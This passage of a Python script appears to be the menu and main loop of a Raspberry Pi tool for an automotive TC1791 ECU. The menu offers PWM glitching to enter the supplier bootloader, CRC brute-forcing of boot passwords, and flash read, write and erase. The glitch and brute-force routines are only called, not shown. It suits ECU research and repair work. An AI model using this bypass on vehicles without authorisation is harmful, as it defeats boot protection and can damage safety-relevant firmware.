    if DRY_RUN:
        warn("=== DRY-RUN MODE ACTIVE — NO COMMANDS WILL TOUCH THE ECU ===\n")

    print("1) Enter SBOOT (login)")
    print("   - Runs PWM glitch, resets ECU, enters Supplier Bootloader.")
    print("2) Extract boot passwords")
    print("   - Performs SBOOT login + CRC brute-force to recover passwords.")
    print("3) Upload BSL")
    print("   - Sends bootloader.bin to ECU RAM and triggers BSL mode.")
    print("4) Read device ID")
    print("   - Reads ECU identification bytes (safe).")
    print("5) Read flash using preset")
    print("   - Choose region (PMEM0/PMEM1/DFLASH/UCB/BOOTROM/CUSTOM) and dump to file.")
    print("6) Write flash using preset")
    print("   - Choose region and write from file (DANGEROUS).")
    print("7) Erase sector (manual address)")
    print("   - Erase a single sector by address (DANGEROUS).")
    print("8) Wiring Test")
    print("   - Tests GPIO, PWM, CAN TX, and ECU presence (safe).")
    print("9) Diagnostics Summary")
    print("   - Pre-flight check of GPIO, PWM, CAN, ECU status.")
    print("10) Calibrate PWM duty cycle")
    print("    - Sweeps PWM duty cycles to find stable SBOOT entry.")
    print("11) Calibrate CRC_DELAY")
    print("    - Tunes timing for CRC brute-force (requires ECU connected).")
    print(f"12) Toggle Dry-Run Mode (currently: {'ON' if DRY_RUN else 'OFF'})")
    print("13) Exit")
    choice = input("Select an option: ").strip()
    return choice


if __name__ == "__main__":
    try:
        print("=== TC1791 CAN BSL – Raspberry Pi 5 version ===")

        while True:
            choice = main_menu()

            if choice == "1":
                info("Running SBOOT login...")
                if confirm(
                    "This will reset the ECU and start PWM glitching. Continue? (y/n): "
                ):
                    sboot_login()
                else:
                    info("Cancelled.")

            elif choice == "2":
                info("Extracting boot passwords...")
                if confirm(
                    "This will perform SBOOT login and CRC brute-force. Continue? (y/n): "
                ):
                    extract_boot_passwords()
                else:
                    info("Cancelled.")

            elif choice == "3":
                info("Uploading BSL...")
                if confirm(
                    "This will upload a bootloader to ECU RAM and trigger BSL mode. Continue? (y/n): "
                ):
                    upload_bsl()
                else:
                    info("Cancelled.")

            elif choice == "4":
                info("Reading device ID...")
                if confirm("Read ECU device ID now? (y/n): "):
                    dev = read_device_id()
                    print("Device ID:", dev.hex())
                else:
                    info("Cancelled.")

            elif choice == "5":
                info("Read flash using preset...")
                base, size = choose_flash_preset()
                if base is None:
                    continue
                filename = input("Output filename: ").strip()
                if confirm(
                    f"Read 0x{size:X} bytes from 0x{base:X} to '{filename}'? (y/n): "
                ):
                    read_bytes_file(base, size, filename)
                else:
                    info("Cancelled.")

            elif choice == "6":
                info("Write flash using preset...")
                base, size = choose_flash_preset()
                if base is None:
                    continue
                filename = input("Input filename: ").strip()
                if not require_state(["BSL"]):
                    continue
                if confirm(
                    f"DANGEROUS: Write up to 0x{size:X} bytes to 0x{base:X} from '{filename}'? (y/n): "
                ):
                    write_file(base.to_bytes(4, "big"), size.to_bytes(4, "big"), filename)
                else:
                    info("Cancelled.")

            elif choice == "7":
                info("Erase sector (manual address)...")
                addr_str = input("Sector base address (hex): ").strip()
                try:
                    addr = int(addr_str, 16)
                except ValueError:
                    error("Invalid hex address.")
                    continue
                if not require_state(["BSL"]):
                    continue
                if confirm(
                    f"DANGEROUS: Erase sector at 0x{addr:X}? (y/n): "
                ):
                    erase_sector(addr.to_bytes(4, "big"))
                else:
                    info("Cancelled.")

            elif choice == "8":
                info("Running wiring test (safe)...")
                wiring_test()

            elif choice == "9":
                info("Running diagnostics summary (safe)...")
                diagnostics_summary()

            elif choice == "10":
                info("Calibrating PWM duty cycle...")
                if confirm(
                    "This will repeatedly reset ECU and run PWM glitching. Continue? (y/n): "
                ):
                    duty = calibrate_pwm_duty()
                    print(f"Best duty cycle found: {duty}%")
                else:
                    info("Cancelled.")

            elif choice == "11":
                info("Calibrating CRC_DELAY...")
                if confirm(
                    "This will repeatedly reset ECU and run CRC validation. Continue? (y/n): "
                ):
                    val = calibrate_crc_delay()
                    print(f"Final CRC_DELAY = {val}")
                else:
                    info("Cancelled.")

            elif choice == "12":
                DRY_RUN = not DRY_RUN
                warn(f"Dry-Run Mode is now {'ON' if DRY_RUN else 'OFF'}.")

            elif choice == "13":
                info("Exiting.")
                break

            else:
                error("Invalid choice. Try again.")

    finally:
        GPIO.cleanup()
        lgpio.gpiochip_close(chip)
        info("GPIO cleaned up.")
